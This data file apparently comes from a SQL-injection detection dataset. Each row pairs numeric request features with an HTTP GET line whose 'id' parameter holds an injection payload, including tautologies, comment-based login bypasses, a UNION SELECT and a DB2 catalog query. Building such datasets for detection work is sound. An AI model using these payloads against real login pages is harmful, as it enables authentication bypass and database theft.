30,1,200,5801,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
31,1,200,1617,7,13,3,2,1,GET login/?id= or true HTTP/1.1
20,1,200,6118,7,2,4,1,1,GET ?id=" # HTTP/1.1
31,1,200,4923,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
20,1,200,5155,7,2,5,2,1,GET ?id='/* HTTP/1.1
37,1,200,1943,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
44,1,200,6247,7,14,7,3,1,GET login/?id=admin") or ("1"="1"/* HTTP/1.1
39,1,200,2706,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
25,1,200,2455,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
75,1,200,6450,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
27,1,200,6227,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
26,1,200,1503,7,4,5,1,1,GET ?id=" or 1=1# HTTP/1.1
87,1,200,3987,24,20,4,2,1,GET login/?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
32,1,200,6024,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
39,1,200,1302,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
31,1,200,1468,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
32,1,200,7928,7,6,5,1,1,GET ?id="or 1=1 or ""=" HTTP/1.1
